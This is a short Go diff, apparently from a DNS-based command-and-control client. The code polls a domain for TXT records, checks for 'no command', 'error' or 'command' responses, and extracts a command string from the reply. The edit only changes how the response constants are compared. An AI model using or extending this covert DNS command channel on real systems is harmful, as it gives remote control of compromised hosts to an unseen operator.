@@ -55,16 +55,16 @@ Example:
 			response := client.Lookup(pollDomain, dns.TypeTXT)
 
 			// Do nothing.
-			if strings.Contains(response.Data, protocol.NoCmdTxtResponse[0]) {
+			if strings.Contains(response.Data, protocol.NoCmdTxtResponse) {
 				continue
 			}
 
-			if strings.Contains(response.Data, protocol.ErrorTxtResponse[0]) {
+			if strings.Contains(response.Data, protocol.ErrorTxtResponse) {
 				log.Error().Msg("server indicated an error. stopping :(")
 				continue
 			}
 
-			if strings.Contains(response.Data, protocol.CmdTxtResponse[0]) {
+			if strings.Contains(response.Data, protocol.CmdTxtResponse) {
 
 				cmdParsed := strings.Split(response.Data, "p=")[1]
 				cmd := strings.Split(cmdParsed, "\"")[0]
